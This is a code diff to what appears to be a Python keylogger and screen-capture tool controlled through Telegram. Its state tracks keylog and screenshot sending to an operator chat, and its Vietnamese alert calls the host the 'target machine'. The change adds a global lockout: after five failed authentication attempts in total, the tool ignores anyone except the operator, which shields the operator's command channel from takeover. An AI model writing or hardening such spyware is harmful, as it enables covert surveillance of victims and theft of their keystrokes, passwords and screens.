@@ -65,7 +65,8 @@ def load_state():
         "paused": False,
         "chat_id": "",
         "auth_failures": {},
-        "blocklist": []
+        "blocklist": [],
+        "globally_locked": False
     }
     with state_lock:
         if os.path.exists(STATE_PATH):
@@ -102,7 +103,7 @@ def save_state(state):
         except Exception as e:
             log_message(f"Error saving state: {e}")
 
-def update_state(last_screenshot_sent=None, last_keylog_sent=None, last_outbox_retry=None, telegram_offset=None, screenshot_interval=None, keylog_send_interval=None, outbox_retry_interval=None, machine_name=None, paused=None, chat_id=None, auth_failures=None, blocklist=None):
+def update_state(last_screenshot_sent=None, last_keylog_sent=None, last_outbox_retry=None, telegram_offset=None, screenshot_interval=None, keylog_send_interval=None, outbox_retry_interval=None, machine_name=None, paused=None, chat_id=None, auth_failures=None, blocklist=None, globally_locked=None):
     state = load_state()
     if last_screenshot_sent:
         state["last_screenshot_sent"] = last_screenshot_sent
@@ -128,6 +129,8 @@ def update_state(last_screenshot_sent=None, last_keylog_sent=None, last_outbox_r
         state["auth_failures"] = auth_failures
     if blocklist is not None:
         state["blocklist"] = blocklist
+    if globally_locked is not None:
+        state["globally_locked"] = globally_locked
     save_state(state)
 
 def process_keylog_text(raw_text):
@@ -1050,6 +1053,10 @@ def poll_telegram():
                     
                     if sender_chat_id != CHAT_ID:
                         state = load_state()
+                        # If the system is permanently locked down, ignore all attempts
+                        if state.get("globally_locked", False):
+                            continue
+                            
                         blocklist = state.get("blocklist", [])
                         if sender_chat_id in blocklist:
                             continue
@@ -1072,7 +1079,15 @@ def poll_telegram():
                                 attempts = auth_failures.get(sender_chat_id, 0) + 1
                                 auth_failures[sender_chat_id] = attempts
                                 
-                                if attempts >= 3:
+                                # Global attempts calculation
+                                total_attempts = sum(auth_failures.values())
+                                
+                                if total_attempts >= 5:
+                                    # Globally lock the auth mechanism forever until manual intervention
+                                    update_state(auth_failures=auth_failures, globally_locked=True)
+                                    log_message(f"Authentication system GLOBALLY LOCKED after {total_attempts} total failed attempts.")
+                                    send_telegram_message(f"🚨 <b>CẢNH BÁO BẢO MẬT KHẨN CẤP:</b> Phát hiện cuộc tấn công dò mật khẩu quy mô lớn (Tổng cộng {total_attempts} lần thử sai). Cơ chế xác thực từ xa đã bị <b>KHOÁ VĨNH VIỄN</b> trên máy mục tiêu. Chỉ có thể mở lại bằng cách can thiệp thủ công vào file cấu hình trên máy.")
+                                elif attempts >= 3:
                                     if sender_chat_id not in blocklist:
                                         blocklist.append(sender_chat_id)
                                     update_state(auth_failures=auth_failures, blocklist=blocklist)
